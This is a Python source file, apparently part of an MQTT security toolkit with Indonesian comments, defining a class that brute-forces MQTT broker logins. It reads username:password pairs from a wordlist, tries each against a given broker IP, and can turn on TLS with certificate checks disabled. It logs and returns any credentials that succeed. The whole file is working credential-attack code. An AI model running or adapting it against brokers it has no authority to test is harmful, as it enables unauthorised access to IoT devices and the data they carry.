import os
import time
import paho.mqtt.client as mqtt
from core.tls_utils import setup_tls_context

# Tambahkan flag tls_logged di BruteForcer
class BruteForcer:
    def __init__(self, wordlist_path="assets/wordlist.txt", logger=None):
        self.wordlist_path = wordlist_path
        self.logger = logger
        self.found_credential = None
        self.tls_logged = False  # Flag agar TLS hanya dilog sekali


    def log(self, message):
        if self.logger:
            self.logger(message)

    def brute_force(self, broker_ip, port=1883, use_tls=False):
        """Melakukan brute force terhadap broker MQTT."""
        if not os.path.exists(self.wordlist_path):
            self.log("[!] Wordlist tidak ditemukan!")
            return None

        with open(self.wordlist_path, encoding='utf-8', errors='ignore') as f:
            creds = [line.strip().split(":") for line in f if ":" in line]

        tls_logged = False  # <== Flag untuk hanya log TLS sekali

        for username, password in creds:
            success = {"ok": None}

            def on_connect(client, userdata, flags, rc):
                if rc == 0:
                    success["ok"] = True
                else:
                    success["ok"] = False

            client = mqtt.Client()
            client.username_pw_set(username, password)
            client.on_connect = on_connect

            if use_tls:
                logger_func = self.log if not tls_logged else None
                setup_tls_context(client, allow_insecure=True, logger=logger_func)
                tls_logged = True  # Setelah log TLS pertama, flag jadi True

            try:
                client.connect(broker_ip, port, 5)
                client.loop_start()

                timeout = 0
                while success["ok"] is None and timeout < 5:
                    time.sleep(0.2)
                    timeout += 0.2

                client.loop_stop()
                client.disconnect()

                if success["ok"] is True:
                    self.found_credential = (username, password)
                    self.log(f"[✓] Valid credentials: {username}:{password}")
                    return self.found_credential
                else:
                    self.log(f"[-] Invalid: {username}:{password}")

            except Exception as e:
                self.log(f"[!] Error koneksi: {e}")
                continue

        return None

